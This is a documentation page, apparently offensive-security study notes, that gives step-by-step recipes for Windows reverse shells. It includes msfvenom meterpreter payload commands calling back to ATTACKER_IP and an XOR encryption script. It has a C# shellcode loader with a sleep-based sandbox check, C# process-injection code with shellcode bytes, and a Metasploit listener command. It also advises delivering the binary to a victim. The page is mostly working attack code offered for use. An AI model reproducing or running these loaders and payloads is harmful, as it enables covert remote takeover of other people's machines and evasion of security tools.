---
title: C#
sidebar_position: 1
---


### **BIN Shellcode XOR Encrypted Reverse Shell**

**Steps**

1. **Craft your `.bin` payload**

```bash
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=[ATTACKER_IP] LPORT=443 -f raw -o [PAYLOAD_NAME].bin

```

1. **XOR Encrypt your payload**, suggested key below but up to you

```bash
# python .\xorencrypt.py <payload_file> <output_file> <xor_key>
python3 ./xorencrypt.py ./pay.bin pay_encrypted.bin a70f8922029506d2e37f375fd638cdf9e2c039c8a1e6e01189eeb4efb

```

```python
# Encryption code, can be found in the GitHub reference or in my GitHub repo for OSEP
import sys

def xor_file(input_file, output_file, key):
    try:
        with open(input_file, "rb") as f:
            data = f.read()
    except FileNotFoundError:
        print("File not found:", input_file)
        sys.exit(1)

    key = key.encode("utf-8")
    key_len = len(key)
    encrypted_data = bytearray()

    for i in range(len(data)):
        current = data[i]
        current_key = key[i % key_len]
        encrypted_data.append(current ^ current_key)

    with open(output_file, "wb") as f:
        f.write(bytes(encrypted_data))

    print("File encrypted and saved as", output_file)

if __name__ == "__main__":
    if len(sys.argv) != 4:
        print("Usage: python xor_encrypt.py <input_file> <output_file> <key>")
        sys.exit(1)

    input_file = sys.argv[1]
    output_file = sys.argv[2]
    key = sys.argv[3]

    xor_file(input_file, output_file, key)

```

> GitHub Reference
> 
1. **Insert your encrypted shellcode in a new Project `C#` Console App**, called *gimmeshell*

```csharp
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace gimmeshell
{
    class Program
    {
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
        [DllImport("kernel32.dll")]
        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
        [DllImport("kernel32.dll")]
        static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
        [DllImport("kernel32.dll")]
        static extern void Sleep(uint dwMilliseconds);
        private static byte[] xor(byte[] cipher, byte[] key)
        {
            byte[] xored = new byte[cipher.Length];
            for (int i = 0; i < cipher.Length; i++)
            {
                xored[i] = (byte)(cipher[i] ^ key[i % key.Length]);
            }
            return xored;
        }
        static void Main(string[] args)
        {
            DateTime t1 = DateTime.Now;
            Sleep(4000);
            double t2 = DateTime.Now.Subtract(t1).TotalSeconds;
            if (t2 < 1.5)
            {
                return;
            }
            string key = "a70f8922029506d2e37f375fd638cdf9e2c039c8a1e6e01189eeb4efb";
            byte[] xorbuf = {
                encryptedShellcode
            };
            byte[] buf = xor(xorbuf, Encoding.ASCII.GetBytes(key));
            int size = buf.Length;
            IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);
            Marshal.Copy(buf, 0, addr, size);
            IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
            WaitForSingleObject(hThread, 0xFFFFFFFF);
        }
    }
}

```

1. **Compile** for *Release and x64*
2. **Start your listener**

```bash
sudo msfconsole -q -x "use multi/handler; set payload windows/x64/meterpreter/reverse_https; set lhost [ATTACKER_IP]; set lport 443; exploit"

```

1. **Find a way to deliver o download this to the victim and then trigger it**, just to mention examples, we could trigger execution using *SQL RCE on Linked Servers, NTLM Relays, or PrintSpooler*

### **Process Injection to Another Program Reverse Shell**

**Steps**

1. **Find the PID of the process that we want to inject**

```powershell
tasklist /FI "IMAGENAME eq [PROGRAM_CHOSEN].exe"
or
Get-Process | Where-Object {$_.Path -like "*[PROGRAM_CHOSEN].exe*"}

```

1. **Generate shellcode**

```bash
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=[ATTACKER_IP] LPORT=[PORT] EXITFUNC=thread -f csharp

```

1. **Create new VS Project**: *New Project > .NET Standard Console App*
2. **Inject shellcode and PID into code**

```csharp
using System;
using System.Runtime.InteropServices;

namespace Inject
{
    class Program
    {
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
        static void Main(string[] args)
        {
            // Replace the PID
            IntPtr hProcess = OpenProcess(0x001F0FFF, false, [PID]);
            IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, 0x1000, 0x3000, 0x40);

            // Replace the shellcode
            byte[] buf = new byte[591] {
            0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xcc,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,
            ....
            0x0a,0x41,0x89,0xda,0xff,0xd5 };
                        IntPtr outSize;
            WriteProcessMemory(hProcess, addr, buf, buf.Length, out outSize);

            IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
        }
    }
}

```

**Option 2 to Find the PID Dynamically**

```csharp
using System;
using System.Runtime.InteropServices;

namespace Inject
{
    class Program
    {
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
        static void Main(string[] args)
        {
            // Find the PID by Name: eg. explorer
            Process[] expProc = Process.GetProcessesByName("[PROGRAM_CHOSEN]");
            int pid = expProc[0].Id;

            IntPtr hProcess = OpenProcess(0x001F0FFF, false, pid);
            IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, 0x1000, 0x3000, 0x40);

            // Replace the shellcode
            byte[] buf = new byte[591] {
            0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xcc,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,
            ....
            0x0a,0x41,0x89,0xda,0xff,0xd5 };
                        IntPtr outSize;
            WriteProcessMemory(hProcess, addr, buf, buf.Length, out outSize);

            IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
        }
    }
}

```

1. **Compile for Release**
2. **Find a way for the user to execute this code**
